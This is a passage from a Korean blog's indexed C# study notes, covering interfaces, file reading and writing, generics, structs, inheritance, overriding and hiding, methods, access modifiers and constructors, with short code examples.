내부에서 클래스와 같이 생성하는 경우는 없음마찬가지로 클래스 내부에 인터페이스를 생성하는 경우도 없음따라서 다른 파일에 생성해주어야 함다른 파일에 인터페이스를 생성하기 위해서는 클래스를 생성할 때와 마찬가지로,프로젝트 &amp;gt; 마우스 오른쪽 버튼 &amp;gt; 추가 &amp;gt; 새 항목 &amp;gt; 인터페이스 를 선택하면 됨이렇게 추가한 인터페이스는 다음과 같은 형태로 생성됨using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;namespace InterfaceBasic{ interface IBasic { }} 인터페이스 멤버인터페이스 내부에는 클래스 내부에 넣을 수 있었던 인스턴스 메서드와 속성을 넣을 수 있음인터페이스 생성interface IBasic{ int TestInstanceMethod(); // 메서드에 내부 구현을 입력할 수 없음 int TestProperty { get; set; } // 속성에도 내부 구현을 입력할 수 없음}인터페이스 상속class Program{ class TestClass : IBasic { } static void Main(string[] args) { }}인터페이스 구현 (인터페이스에 커서 올린 후 Ctrl + . &amp;gt; 인터페이스 구현)class TestClass : IBasic{ public int TestInstanceMethod() { throw new NotImplementedException(); // 이후 구현 } public int TestProperty { get { throw new NotImplementedException(); // 이후 구현 } set { throw new NotImplementedException(); // 이후 구현 } }} 인터페이스 다형성인터페이스를 구현한 클래스는 인터페이스를 상속하게 됨따라서 다형성을 구현할 수 있게 되므로 다음과 같은 코드가 가능해짐static void Main(string[] args){ IBasic basic = new TestClass(); // 클래스가 부모인 인터페이스로 자료형 변환} 인터페이스 다중 상속인터페이스를 사용하면 다중 상속과 비슷한 기능을 구현할 수 있음언어의 성능 저하와 디자인상의 이유로 인해 현대 프로그래밍 언어에서는 하나의 클래스는 하나의 클래스만 상속받을 수 있음그러나 인터페이스를 사용한 다중 상속은 대부분의 현대 프로그래밍 언어에서 허용하고 있음클래스 상속과 인터페이스 상속을 함께 활용하면 하나의 클래스가 여러 다형성을 가질 수 있게 됨class Program{ class Parent { } class Child : Parent, IDisposable, IComparable // 한 개의 클래스와 두 개의 인터페이스를 상속받음 { public void Dispose() { throw new NotImplementedException(); // IDisposable 인터페이스 구현 } public int CompareTo(object obj) { throw new NotImplementedException(); // IComparable 인터페이스 구현 } } static void Main(string[] args) { }}이렇게 상속한 경우 다음과 같이 세 종류로 자료형 변환이 가능해짐Child child = new Child();Parent childAsParent = new Child();IDisposable childAsDisposable = new Child();IComparable childAsComparable = new Child();인터페이스를 활용하면 코드에 규약을 부여하여 여러 사람이 함께 작업할 때 안정성을 높힐 수 있음인터페이스를 어떻게 활용하는지 알고 싶다면 디자인 패턴과 관련된 내용을 살펴보면 됨 (디자인 패턴의 90% 이상은 인터페이스를 활용함) Head First Design Pattern 파일 처리 (IDisposable 인터페이스)파일에 문자열 쓰기class Program{ static void Main(string[] args) { File.WriteAllText(@&quot;C:\\test\\test.txt&quot;, &quot;문자열을 파일에 씁니다.&quot;); }}문자열 앞에 @ 기호를 붙여주면 문자열 내부에서 이스케이프 문자를 사용할 수 없는 대신 \\ 기호를 곧바로 문자열로 인식하므로 경로 입력 시 코드의 가독성을 높일 수 있음파일에 문자열 쓰고 읽기class Program{ static void Main(string[] args) { File.WriteAllText(@&quot;C:\\test\\test.txt&quot;, &quot;문자열을 파일에 씁니다.&quot;); // 디렉토리가 존재하지 않으면 오류 발생 Console.WriteLine(File.ReadAllText(@&quot;C:\\test\\test.txt&quot;)); }}문자열을 파일에 씁니다.아주 큰 용량의 파일을 한꺼번에 쓰거나 읽는 것은 시스템에 부담이 가는 일이므로, C#은 파일을 한 줄씩 읽고 쓰는 방법을 굉장히 다양하게 제공함한 줄씩 쓸 때는 StreamWriter 클래스를 사용함StreamWriter 클래스를 추가 후에 F12 를 눌러 정의로 이동해보면, StreamWriter 클래스는 abstract TextWriter 클래스를 상속받으며, TextWriter 클래스는 IDisposable 의 상속을 받음을 확인할 수 있음결과적으로 StreamWriter 클래스는 IDisposable 인터페이스를 구현한 클래스임따라서 using 구문을 사용해 다음과 같이 코드를 구성하는 것이 기본임static void Main(string[] args){ using (StreamWriter writer = new StreamWriter()) { }}이렇게 코드를 구성하면 using 구문을 탈출할 때 자동으로 StreamWriter 클래스의 인스턴스가 가진 Dispose() 메서드를 호출하게 됨StreamWriter 클래스의 인스턴스는 Write() 또는 WriteLine() 메서드로 다음과 같이 글자를 입력할 수 있음static void Main(string[] args){ using (StreamWriter writer = new StreamWriter(@&quot;C:\\test\\test.txt&quot;)) { writer.WriteLine(&quot;안녕하세요&quot;); writer.WriteLine(&quot;StreamWriter 클래스를 사용해&quot;); writer.WriteLine(&quot;글자를 여러 줄 입력해봅니다.&quot;); for (int i=0; i&amp;lt;10; i++) { writer.WriteLine(&quot;반복문 - &quot; + i); } } Console.WriteLine(File.ReadAllText(@&quot;C:\\test\\test.txt&quot;));}한 줄씩 읽을 때는 StreamReader 클래스를 사용함StreamReader 클래스도 IDisposable 인터페이스를 구현하고 있으므로 using 구문을 사용할 수 있음static void Main(string[] args){ using (StreamReader reader = new StreamReader(@&quot;C:\\test\\test.txt&quot;)) { string line = reader.ReadLine(); Console.WriteLine(line); }}ReadLine() 메서드는 한 줄 읽으라는 뜻이므로 전체 파일 내용을 읽고 싶을 때는 반복문을 사용해서 읽어줘야 함static void Main(string[] args){ using (StreamReader reader = new StreamReader(@&quot;C:\\test\\test.txt&quot;)) { string line; while ((line = reader.ReadLine())!=null) { Console.WriteLine(line); } }}" }, { "title": "C# 프로그래밍 - CH8 클래스 심화", "url": "/posts/Csharp-ch8/", "categories": "Notes, C#", "tags": "", "date": "2022-03-09 05:00:00 +0900", "snippet": " 제네릭List&amp;lt;int&amp;gt; list = new List&amp;lt;int&amp;gt;();클래스 내부에서 자료형에 별칭(Alias)을 지정하는 기능class Wanted&amp;lt;T&amp;gt;{}이렇게 &amp;lt; &amp;gt; 기호 내부에 식별자를 지정해서 Wanted&amp;lt;int&amp;gt; 처럼 사용하면 T 에 int 자료형이 할당됨마찬가지로 Wanted&amp;lt;float&amp;gt; 처럼 사용하면 T 에 float 자료형이 할당됨다음 코드는 제네릭을 사용하여 변수 Value 의 자료형을 원하는 자료형으로 지정함class Wanted&amp;lt;T&amp;gt;{ public T Value; public Wanted(T value) { this.Value = value; }}class Program{ static void Main(string[] args) { Wanted&amp;lt;string&amp;gt; wantedString = new Wanted&amp;lt;string&amp;gt;(&quot;String&quot;); Wanted&amp;lt;int&amp;gt; wantedInt = new Wanted&amp;lt;int&amp;gt;(52273); Wanted&amp;lt;double&amp;gt; wantedDouble = new Wanted&amp;lt;double&amp;gt;(52.273); Console.WriteLine(wantedString.Value); Console.WriteLine(wantedInt.Value); Console.WriteLine(wantedDouble.Value); }}제네릭을 하나 지정할 때는 보통 식별자로 T 를 사용함두 개 이상의 제네릭을 사용한다면?class Test&amp;lt;T, U&amp;gt;{} where 키워드제네릭에 모든 자료형을 허용하면 안 되는 경우, where 키워드를 사용해서 제네릭을 제한할 수 있음class Test&amp;lt;T, U&amp;gt; where T : class where U : struct{}class Test&amp;lt;T, U&amp;gt; where T : IComparable where U : IComparable, IDisposable{} 인덱서인덱서 선언class Products{ public int this[int i] { get { return i; } set { Console.WriteLine(i + &quot;번째 상품 설정&quot;); } }}인덱서를 활용하여 배열처럼 사용하는 제곱 클래스class SquareCalculator{ public int this[int i] { get { return i * i; } }}class Program{ static void Main(string[] args) { SquareCalculator square = new SquareCalculator(); Console.WriteLine(square[10]); Console.WriteLine(square[20]); Console.WriteLine(square[30]); }}그냥 메서드로 만들어서 사용해도 똑같음하지만 만약 배열과 유사한 클래스를 만든다면, 인덱서를 활용하여 기존의 배열과 비슷한 방법으로 사용할 수 있게 만드는 것이 편리함 out 키워드값을 여러 개 반환하기 위한 키워드out 키워드를 사용하는 대표적인 메서드는 TryParse() 메서드임TryParse() 메서드는 파싱 성패 여부와 파싱한 결과값을 동시에 반환함class Program{ static void Main(string[] args) { Console.Write(&quot;숫자 입력: &quot;); int output; bool result = int.TryParse(Console.ReadLine(), out output); // out 키워드를 붙여서 매개변수 넣어주기 if (result) { Console.WriteLine(&quot;입력한 숫자: &quot; + output); } else { Console.WriteLine(&quot;숫자를 입력해주세요!&quot;); } }}위 예시에서, result 에는 파싱 성패 여부가 담기고 output 에는 파싱한 결과값이 담김 out 키워드를 사용하는 메서드 생성class Program{ static void NextPosition(int x, int y, int vx, int vy, out int rx, out int ry) { // 다음 위치 = 현재 위치 + 현재 속도 rx = x + vx; ry = y + vy; } static void Main(string[] args) { int x = 0; int y = 0; int vx = 1; int vy = 1; Console.WriteLine(&quot;현재 좌표: (&quot; + x + &quot;,&quot; + y + &quot;)&quot;); NextPosition(x, y, vx, vy, out x, out y); // out 키워드를 붙여서 매개변수 넣어주기 Console.WriteLine(&quot;다음 좌표: (&quot; + x + &quot;,&quot; + y + &quot;)&quot;); }} 구조체간단한 객체를 만들 때 사용하는 형식클래스와 거의 동일한 구문을 사용하지만, 복사 형식이 다르고 클래스보다 제한이 조금 많음또한 상속이 불가능하며, 인터페이스를 구현할 수도 없음대신 클래스보다 안정성 측면에서는 높음C#의 기본 자료형은 모두 구조체로 정의되어 있음 구조체 선언struct Point{ public int x; public int y;}구조체는 new 키워드를 사용하지 않아도 인스턴스를 생성할 수 있음다만 이 경우, 멤버 변수를 별도로 초기화하지 않으면 해당 멤버 변수를 사용할 때 오류가 발생함 new 키워드를 사용하지 않고 구조체 인스턴스 생성class Program{ struct Point { public int x; public int y; } static void Main(string[] args) { Point point; point.x = 10; point.y = 10; Console.WriteLine(point.x); Console.WriteLine(point.y); }} 구조체의 생성자구조체는 클래스와 다르게, 매개변수 없는 생성자를 선언할 수 없음따라서 반드시 다음과 같이 매개변수를 넣어 생성자를 만들어야 함struct Point{ public int x; public int y; public Point(int x, int y) { this.x = x; this.y = y; }}왜 구조체는 매개변수 없는 생성자를 만들 수 없을까?이유는 매개변수 없는 생성자가 자동으로 정의되기 때문임위와 같이 매개변수 있는 생성자를 만들어도, 매개변수 없는 생성자를 사용할 수 있음이 경우 내부 변수는 해당 자료형의 기본 값으로 초기화됨숫자 관련 자료형이라면 0 으로, 문자열 또는 객체라면 null 로 초기화됨Point point = new Point();Console.WriteLine(point.x);Console.WriteLine(point.y);00 구조체 생성자가 갖는 제약구조체 생성자에서는 반드시 모든 멤버 변수를 초기화된 상태로 만들어주어야 함또한 선언과 동시에 멤버 변수를 초기화할 수 없음struct Point{ public int x; public int y; public string testA; public string testB = &quot;init&quot;; // 선언과 동시에 초기화할 수 없으므로 오류 발생 public Point(int x, int y) // 멤버 변수 testA를 초기화하지 않았으므로 오류 발생 { this.x = x; this.y = y; }}struct Point{ public int x; public int y; public string testA; public string testB; public Point(int x, int y) // 생성자 오버로딩 { this.x = x; this.y = y; this.testA = &quot;초기화&quot;; this.testB = &quot;초기화&quot;; } public Point(int x, int y, string test) // 생성자 오버로딩 { this.x = x; this.y = y; this.testA = test; this.testB = test; }}이렇듯 복잡한 이유는 구조체의 가장 중요한 의미가 안정성이기 때문임따라서 모든 매개변수를 초기화해서 사용하게 만드는 것 구조체 복사구조체는 값 복사가 이루어짐class Program{ class PointClass { public int x; public int y; public PointClass(int x, int y) { this.x = x; this.y = y; } } struct PointStruct { public int x; public int y; public PointStruct(int x, int y) { this.x = x; this.y = y; } } static void Main(string[] args) { // 클래스 PointClass pointClassA = new PointClass(10, 20); PointClass pointClassB = pointClassA; // 참조 복사 발생 pointClassB.x = 100; pointClassB.y = 200; Console.WriteLine(&quot;pointClassA: &quot; + pointClassA.x + &quot;,&quot; + pointClassA.y); Console.WriteLine(&quot;pointClassB: &quot; + pointClassB.x + &quot;,&quot; + pointClassB.y); Console.WriteLine(); // 구조체 PointStruct pointStructA = new PointStruct(10, 20); PointStruct pointStructB = pointStructA; // 값 복사 발생 pointStructB.x = 100; pointStructB.y = 200; Console.WriteLine(&quot;pointStructA: &quot; + pointStructA.x + &quot;,&quot; + pointStructA.y); Console.WriteLine(&quot;pointStructB: &quot; + pointStructB.x + &quot;,&quot; + pointStructB.y); }}pointClassA: 100,200pointClassB: 100,200pointStructA: 10,20pointStructB: 100,200" }, { "title": "C# 프로그래밍 - CH7 상속과 다형성", "url": "/posts/Csharp-ch7/", "categories": "Notes, C#", "tags": "", "date": "2022-03-09 04:00:00 +0900", "snippet": " 상속과 다형성반복을 줄이기 위해 만들어진 방법 상속과 다형성을 사용하지 않은 예Dog 클래스class Dog{ public int Age { get; set; } public string Color { get; set; } public Dog() { this.Age = 0; } public void Eat() { Console.WriteLine(&quot;냠냠 먹습니다&quot;); } public void Sleep() { Console.WriteLine(&quot;쿨쿨 잠을 잡니다&quot;); } public void Bark() { Console.WriteLine(&quot;왈왈 짖습니다&quot;); }}Cat 클래스class Cat{ public int Age { get; set; } public Cat() { this.Age = 0; } public void Eat() { Console.WriteLine(&quot;냠냠 먹습니다&quot;); } public void Sleep() { Console.WriteLine(&quot;쿨쿨 잠을 잡니다&quot;); } public void Meow() { Console.WriteLine(&quot;냥냥 웁니다&quot;); }}Dog 클래스와 Cat 클래스의 인스턴스를 만들고 메서드 실행static void Main(string[] args){ List&amp;lt;Dog&amp;gt; Dogs = new List&amp;lt;Dog&amp;gt;() { new Dog(), new Dog(), new Dog() }; List&amp;lt;Cat&amp;gt; Cats = new List&amp;lt;Cat&amp;gt;() { new Cat(), new Cat(), new Cat() }; foreach (var item in Dogs) { item.Eat(); item.Sleep(); item.Bark(); } foreach (var item in Cats) { item.Eat(); item.Sleep(); item.Meow(); }}문제 → 의미 없이 반복되는 부분이 굉장히 많음 (유지보수에도 적합하지 않음)해결책 → 상속과 다형성 상속자식 클래스:부모 클래스클래스 사이에 부모 자식 관계를 정의하는 작업Animal 클래스 (부모 클래스)class Animal{ public int Age { get; set; } public void Animal() { this.Age = 0; } public void Eat() { Console.WriteLine(&quot;냠냠 먹습니다.&quot;); } public void Sleep() { Console.WriteLine(&quot;쿨쿨 잠을 잡니다&quot;); }}Dog 클래스와 Cat 클래스 (자식 클래스)class Dog : Animal{ public string Color { get; set; } public void Bark() { Console.WriteLine(&quot;왈왈 짖습니다.&quot;); }}class Cat : Animal{ public void Meow() { Console.WriteLine(&quot;냥냥 웁니다.&quot;); }}자식 클래스는 부모 클래스의 public 또는 protected 멤버에 접근할 수 있음 다른 접근 제한자 접근 제한자 내부 클래스 외부 클래스 파생 클래스 프로젝트 public O O O O internal O O O   protected O   O   private O       protected internal O 같은 어셈블리 안에 있을 때 접근 가능 O   base 키워드부모 자식 간 멤버 이름이 겹치는 등의 특수한 이유(하이딩 등)로 인해 부모의 메서드에 접근할 수 없을 때,this 키워드와 같은 형태로 base 키워드를 사용함this가 자신을 나타내는 키워드라면 base는 부모를 나타내는 키워드임 protected 접근 제한자private 과 비슷하지만 상속한 클래스(파생 클래스)에서는 접근할 수 있음 다형성하나의 클래스가 여러 형태로 변환될 수 있는 성질 (=자식 클래스가 부모 클래스로 위장하는 것)Animal dog = new Dog();Animal cat = new Cat();실제 들어있는 것은 각각 Dog과 Cat이지만, 외관상으로는 Animal 클래스이므로 사용할 수 있는 멤버는 Animal 클래스의 멤버 뿐임 부모 클래스로 위장함으로써 얻을 수 있는 효익하나의 Animal 배열 또는 리스트에 여러 Dog 클래스와 Cat 클래스를 넣을 수 있음List&amp;lt;Animal&amp;gt; Animals = new List&amp;lt;Animal&amp;gt;(){ new Dog(), new Cat(), new Cat(), new Dog(), new Dog(), new Cat(), new Dog(), new Dog()};foreach (var item in Animals){ item.Eat(); item.Sleep();} 부모 클래스로 위장한 자식이 자식 클래스에 있는 메서드를 사용하려면?자식 클래스로 자료형 변환을 해주어야 함 최상위 클래스C#에서 만드는 모든 클래스는 Object 라는 클래스의 상속을 받게 됨즉, 다형성을 활용하여 다음과 같이 사용할 수 있음List&amp;lt;Object&amp;gt; listOfObject = new List&amp;lt;Object&amp;gt;();listOfObject.Add(new Dog());listOfObject.Add(new Cat());마찬가지로 int, float 자료형 등도 모두 Object 클래스의 상속을 받으므로 다음과 같이 사용할 수도 있음List&amp;lt;Object&amp;gt; listOfObject = new List&amp;lt;Object&amp;gt;();listOfObject.Add(new Dog());listOfObject.Add(new Cat());listOfObject.Add(52);listOfObject.Add(52.273f); is 키워드객체 is 클래스특정한 객체가 어떤 클래스인지 확인하기 위한 키워드static void Main(string[] args){ List&amp;lt;Animal&amp;gt; Animals = new List&amp;lt;Animal&amp;gt;() { }; foreach (var item in Animals) { item.Eat(); item.Sleep(); if (item is Dog) { } if (item is Cat) { } }}변수 item 이 Dog 클래스라면 다음의 경우 모두 true 를 출력하게 됨item is Dogitem is Animalitem is Object 일반적인 자료형 변환(클래스) 변수변환에 실패하면 예외가 발생함foreach (var item in Animals){ item.Eat(); item.Sleep(); if (item is Dog) { ((Dog)item).Bark(); } if (item is Cat) { ((Cat)item).Meow(); }} as 키워드로 자료형 변환변수 as 클래스변환에 실패하면 null 을 넣어줌foreach (var item in Animals){ item.Eat(); item.Sleep(); var dog = item as Dog; if (dog!=null) { dog.Bark(); } var cat = item as Cat; if (cat!=null) { cat.Meow(); }} 상속의 생성자자식 인스턴스를 생성하면, 부모가 가지고 있는 멤버의 초기화를 위해 부모 생성자도 자동으로 호출됨이 때, 호출되는 순서는 부모 생성자 → 자식 생성자 임부모 생성자 호출을 명시적으로 지정하고 싶을 때는 base() 키워드를 사용함다음과 같이 부모 생성자가 오버로딩되어있는 경우가 한 가지 예라고 할 수 있음class Program{ class Parent { public Parent() { Console.WriteLine(&quot;Parent()&quot;); } public Parent(int param) { Console.WriteLine(&quot;Parent(int param)&quot;); } public Parent(string param) { Console.WriteLine(&quot;Parent(string param)&quot;); } } class Child : Parent { public Child() : base(10) { Console.WriteLine(&quot;Child() : base(10)&quot;); } public Child(string input) : base(input) { Console.WriteLine(&quot;Child(string input) : base(input)&quot;); } } static void Main(string[] args) { Child childA = new Child(); Child childB = new Child(&quot;string&quot;); }} 클래스 변수 상속클래스 변수는 상속되어도 부모 자식 클래스 간 공유되는 개념이기 때문에 각 클래스에서 같은 변수에 대해 같은 조작을 가하게 되면 변동값은 두 배가 된다. 섀도잉과 하이딩변수에 같은 이름을 사용하면 이름 충돌이 발생하게 됨이름 재사용의 종류는 다음과 같음 오버로딩 오버라이딩 섀도잉 하이딩 업스큐어링 이름을 재사용하면 코드를 이해하기 힘들어지므로 지양하는 것이 좋음 섀도잉변수의 이름이 겹치면 자신과 가장 가까운 변수를 사용하게 됨즉, 다음과 같은 경우 출력되는 number 는 메서드 내부의 변수 number 임class Program{ public static int number = 10; static void Main(string[] args) { int number = 20; Console.WriteLine(number); }}이렇듯 특정한 영역에서 이름이 겹쳐 다른 변수를 가리는 것을 섀도잉 이라고 부름어떤 대상이 섀도잉되면 일반적인 방법으로는 가려진 변수에 접근할 수 없음 하이딩부모 클래스와 자식 클래스 간 동일한 이름의 멤버가 생성되었을 시 섀도잉과 같은 현상이 일어나는 것을 하이딩이라고 부름즉, 다음과 같은 경우 출력되는 variable 은 자식 클래스의 변수 variable 임class Program{ class Parent { public int variable = 273; } class Child : Parent { public string variable = &quot;hiding&quot;; } static void Main(string[] args) { Child child = new Child(); Console.WriteLine(Child.variable); }}하이딩을 하게 되면 정상적인 상속을 막아버릴 수 있음이 경우 만약 부모 클래스에 있는 int 자료형의 변수를 사용하고 싶다면,다음과 같이 부모로 자료형을 변환한 후 사용하면 됨static void Main(string[] args){ Child child = new Child(); Console.WriteLine(((Parent)child).variable);} 메서드 하이딩메서드는 변수와 다르게 충돌이 발생할 때 하이딩할지 오버라이딩할지를 결정할 수 있음 하이딩과 오버라이딩부모 클래스와 자식 클래스 멤버의 이름을 동일하게 작성할 때 하이딩 또는 오버라이딩이 일어나므로 두 경우를 명확하게 구분해주어야 함하이딩은 멤버 전체(변수, 메서드 등)에서 모두 일어나지만, 오버라이딩은 메서드와 관련되어서만 일어남 new 메서드를 사용한 하이딩하이딩 = 같은 이름으로 멤버를 만들어 부모의 멤버를 숨기는 것숨겨져 있을 뿐이므로 클래스형을 변환하는 등의 작업을 하면 숨겨진 멤버를 찾을 수 있음class Program{ class Parent { public int variable = 273; public void Method() { Console.WriteLine(&quot;부모의 메서드&quot;); } } class Child { public new string variable = &quot;hiding&quot;; public new void Method() { Console.WriteLine(&quot;자식의 메서드&quot;); } } static void Main(string[] args) { Child child = new Child(); child.Method(); ((Parent).child).Method(); }}new 키워드를 적지 않으면 경고가 발생하지만 실행은 됨 virtual 메서드와 override 메서드를 사용한 오버라이딩오버라이딩 = 부모의 메서드를 덮어씌우는 것자식의 메서드가 부모의 메서드를 완전히 덮어씌워버리므로, 부모로 클래스형을 변환한다해도 자식에서 다시 정의한 메서드가 호출됨class Program{ class Parent { public virtual void Method() { Console.WriteLine(&quot;부모의 메서드&quot;); } } class Child : Parent { public override void Method() { Console.WriteLine(&quot;자식의 메서드&quot;); } } static void Main(string[] args) { Child child = new Child(); child.Method(); ((Parent)child).Method(); }} 하이딩과 오버라이딩의 활용class Animal{ public virtual void Eat() { Console.WriteLine(&quot;냠냠 먹습니다.&quot;); }}class Dog : Animal{ public new void Eat() // 하이딩 { Console.WriteLine(&quot;강아지 사료를 먹습니다.&quot;); }}class Cat : Animal{ public override void Eat() // 오버라이딩 { Console.WriteLine(&quot;고양이 사료를 먹습니다.&quot;); }}static void Main(string[] args){ List&amp;lt;Animal&amp;gt; Animals = new List&amp;lt;Animal&amp;gt;() { new Dog(), new Cat(), new Cat(), new Dog(), new Dog(), new Cat(), new Dog(), new Dog() }; foreach (var item in Animals) { item.Eat(); }}냠냠 먹습니다.고양이 사료를 먹습니다.고양이 사료를 먹습니다.냠냠 먹습니다.냠냠 먹습니다.고양이 사료를 먹습니다.냠냠 먹습니다.냠냠 먹습니다. 상속과 오버라이딩 제한클래스에 절대 상속하지 말라거나 반드시 상속하라는 정보를 입력하는 것또한, 메서드에 더 이상 오버라이딩하지 말라거나 무조건 오버라이딩해달라는 정보를 입력하는 것 sealed 키워드클래스 → 절대 상속하지 말 것class Program{ sealed class Parent { public void Test() { } } class Child : Parent // 오류 발생 { public void Test() { } }}메서드 → 더 이상 오버라이딩하지 말 것class Parent{ public virtual void Test() { }}class Child : Parent{ sealed public override void Test() { }}class GrandChild : Child{ public override void Test() { } // 오류 발생} abstract 키워드클래스 → 반드시 상속해서 쓸 것해당 클래스 자체는 인스턴스를 만들어 사용할 수 없게 됨class Program{ abstract class Parent { public void Test() { } } class Child : Parent { public void Test() { } } static void Main(string[] args) { Parent parent = new Parent(); // 오류 발생 Child child = new Child(); }}메서드 → 반드시 오버라이딩할 것abstract 키워드를 메서드에 적용하려면 반드시 클래스에도 abstract 키워드를 적용해야 함abstract 키워드를 적용한 메서드에는 { } 를 적지 않고 곧바로 세미콜론을 찍음 → 어차피 상속해서 사용할 것이므로 내용을 적지 않는 것abstract class Parent{ public abstract void Test();}class Child : Parent{ public override void Test() { } // 이처럼 오버라이딩해주면 오류가 발생하지 않음}abstract 키워드를 적용했다면 virtual 키워드는 적어주지 않아도 됨 (입력 시 오류 발생)" }, { "title": "C# 프로그래밍 - CH6 메서드", "url": "/posts/Csharp-ch6/", "categories": "Notes, C#", "tags": "", "date": "2022-03-08 19:00:00 +0900", "snippet": " 메서드접근 제한자 반환형 메서드 이름(매개변수){ 메서드 코드}기본class Test{ public int Power(int x) { return x * x; }}static void Main(string[] args){ Test test = new Test(); Console.WriteLine(test.Power(10)); Console.WriteLine(test.Power(20));}두 개의 매개변수를 갖는 메서드class Test{ public int Multi(int x, int y) { return x * y; }}static void Main(string[] args){ Test test = new Test(); Console.WriteLine(test.Multi(2, 4)); Console.WriteLine(test.Multi(3, 5));}메서드는 아무것도 반환하지 않아도 됨이 경우 반환형 위치에 void 를 입력할 것아무것도 반환하지 않는 메서드는 반환이라는 것에 목적을 두기보다, 메서드 내부에서 일어나는 처리에 비중을 둠 (ex.Main())class Test{ public void Print() { Console.WriteLine(&quot;Print() 메서드가 호출되었습니다.&quot;) }}static void Main(string[] args){ Test test = new Test(); test.Print();} 매개변수와 반환min부터 max까지의 숫자를 더해 반환하는 메서드class Test{ public int Sum(int min, int max) { int output = 0; for (int i=min; i&amp;lt;=max; i++) { output += i; } return output; }}static void Main(string[] args){ Test test = new Test(); Console.WriteLine(test.Sum(1, 10));}min부터 max까지의 숫자를 곱해 반환하는 메서드class Test{ public long Multi(int min, int max) { long output = 1; for (int i=min; i&amp;lt;=max; i++) { output *= i; } return output; }}static void Main(string[] args){ Test test = new Test(); Console.WriteLine(test.Multi(1, 20));} 클래스 메서드변수와 마찬가지로, 메서드도 인스턴스 메서드와 클래스 메서드가 있음클래스 변수와 마찬가지로, 클래스 메서드 생성 시 접근 제한자 뒤에 static 키워드를 붙여줌접근 제한자 static 반환형 메서드 이름 (매개변수) { 메서드 코드 }인스턴스를 생성하지 않아도 클래스 이름 뒤에 . 기호를 찍고 곧바로 사용할 수 있음class MyMath{ public static int Abs(int input) { if (input&amp;lt;0) { return -input; } else { return input; } }}static void Main(string[] args){ Console.WriteLine(MyMath.Abs(-15)); Console.WriteLine(MyMath.Abs(20));} 클래스 메서드에서 사용할 수 없는 것static 키워드를 붙인 변수 또는 메서드는 프로그램을 실행하는 순간에 메모리에 올라가게 됨클래스 메서드에서는 아직 메모리에 올라가지 않은 인스턴스 변수와 인스턴스 메서드를 사용할 수 없음즉, 다음과 같은 코드에서는 오류가 발생함class Program{ public int instanceVar = 10; static void Main(string[] args) { Console.WriteLine(instanceVar); }}이를 수정하려면 사용하고자 하는 인스턴수 변수와 인스턴스 메서드에 static 키워드를 붙여 클래스 변수와 클래스 메서드로 만들어주어야 함class Program{ public static int instanceVar = 10; static void Main(string[] args) { Console.WriteLine(instanceVar); }} 오버로딩(≠ 오버라이딩)이름은 같고, 매개변수는 다른 메서드를 만드는 것을 오버로딩이라고 부름class MyMath{ public static int Abs(int input) { if (input&amp;lt;0) { return -input; } else { return input; } } public static double Abs(double input) { if (input&amp;lt;0) { return -input; } else { return input; } } public static long Abs(long input) { if (input&amp;lt;0) { return -input; } else { return input; } }}static void Main(string[] args){ Console.WriteLine(MyMath.Abs(50)); Console.WriteLine(MyMath.Abs(-50)); Console.WriteLine(MyMath.Abs(50.123)); Console.WriteLine(MyMath.Abs(-50.123)); Console.WriteLine(MyMath.Abs(21474836470)); Console.WriteLine(MyMath.Abs(-21474836470));}오버로딩은 이름이 같고 매개변수가 다를 때 일어남반환값이 다르다고 해서 오버로딩이 일어나지는 않음즉, 다음과 같은 코드에서는 오류가 발생함class Test{ public int Test(int input) { } public double Test(int input) { } public long Test(int input) { }}메서드를 호출할 때 어떤 메서드를 호출해야하는지 정확히 알 수 없기 때문임 접근 제한자접근 제한자 자료형 변수 이름;접근 제한자 반환형 메서드 이름(매개변수) { 메서드 코드 }C#은 접근 제한자가 굉장히 많음 (모두 알아보는 것은 불가능)private 과 public 이 가장 많이 사용됨 private 접근 제한자접근 제한자를 입력하지 않으면 자동으로 private 이 설정됨Main() 메서드를 보면 접근 제한자가 적혀있지 않으므로 private 접근 제한자가 설정되어있다고 볼 수 있음static void Main(string[] args){}private 접근 제한자가 걸리면 외부 클래스에서 접근할 수 없음즉, 다음과 같은 코드에서는 오류가 발생함class Test{ public void TestMethod() { Program.Main(new string[] { &quot;&quot; }); }}class Program{ static void Main(string[] args) { }}한편, 자신의 클래스 내부에서는 해당 메서드를 호출할 수 있음자신의 클래스 내부의 메서드 뿐만 아니라, 자신의 클래스 내부에 있는 클래스의 메서드에서도 접근 가능함class Program{ class Test { public void TestMethod() { Program.Main(new string[] { &quot;&quot; }); // 자신의 클래스 내부 클래스의 메서드 } } public void TestMethod() { Program.Main(new string[] { &quot;&quot; }); // 자신의 클래스 내부의 메서드 } static void Main(string[] args) { }} public 접근 제한자외부 클래스에서 Main() 메서드를 호출하고 싶다면, public 접근 제한자를 붙여 공개 상태로 만들어주면 됨class Test{ public void TestMethod() { Program.Main(new string[] { &quot;&quot; }); }}class Program{ public static void Main(string[] args) { }}public 접근 제한자가 걸린 변수 또는 메서드는 모든 곳에서 접근할 수 있음외부에서 정말 사용할 일이 없는 변수 또는 메서드는 안전하게 private 을 붙여주는 것이 좋음 생성자무언가를 생성할 때 자동으로 호출되는 메서드인스턴스 생성자 = 인스턴스를 생성할 때 자동으로 호출되는 메서드인스턴스 생성자의 조건 이름이 클래스 이름과 같아야 함 접근 제한자는 public 이어야 함 (private 생성자는 기능이 다름) 반환과 관련된 선언을 하지 않음 생성자는 일반적으로 인스턴스 변수를 초기화하는 일을 함 public 생성자public 클래스 이름(매개변수) { }class Product{ public string name; public int price; public Product(string name, int price) { this.name = name; this.price = price; }}인스턴스 생성 시 카운터 증가 &amp;amp; 생성된 순서를 자신의 id로 지정class Program{ class Product { public static int counter = 0; public int id; public string name; public int price; public Product(string name, int price) { Product.counter = counter + 1; this.id = counter; this.name = name; this.price = price; } } static void Main(string[] args) { Product productA = new Product(&quot;감자&quot;, 1000); Product productB = new Product(&quot;고구마&quot;, 1500); Product productC = new Product(&quot;당근&quot;, 2000); Console.WriteLine(productA.id + &quot; : &quot; + productA.name); Console.WriteLine(productB.id + &quot; : &quot; + productB.name); Console.WriteLine(productC.id + &quot; : &quot; + productC.name); Console.WriteLine(&quot;총 개수 : &quot; + Product.counter + &quot;개&quot;); }} private 생성자생성자로 클래스의 인스턴스를 만들 수 없게 하고 싶을 때 private 생성자를 사용함즉, 다음과 같은 코드에서는 오류가 발생함class Program{ class Hidden { private Hidden() { } } static void Main(string[] args) { Hidden hidden = new Hidden(); }}이런 기능이 왜 필요할까? 클래스가 정적 멤버만 갖고 있을 때 (변하지 않는 멤버) 팩토리 메서드 패턴에서 팩토리 메서드로만 인스턴스를 생성하게 하고 싶을 때 static 생성자 (=정적 생성자)정적 